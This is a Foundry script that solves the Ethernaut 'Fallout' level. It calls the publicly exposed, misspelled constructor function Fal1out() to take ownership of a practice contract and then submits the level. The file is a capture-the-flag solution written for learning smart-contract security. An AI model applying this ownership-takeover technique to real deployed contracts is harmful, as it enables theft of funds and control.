// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Fallout} from "../src/Level02.sol";
import "forge-std/console.sol";

contract Level02 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));

    function run() public {
        Fallout instance = Fallout(payable(vm.envAddress("LVL02_ADDR")));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        instance.Fal1out();
        ethernaut.submitLevelInstance(address(instance));
        console.log("Level02: Success");

        vm.stopBroadcast();
    }
}
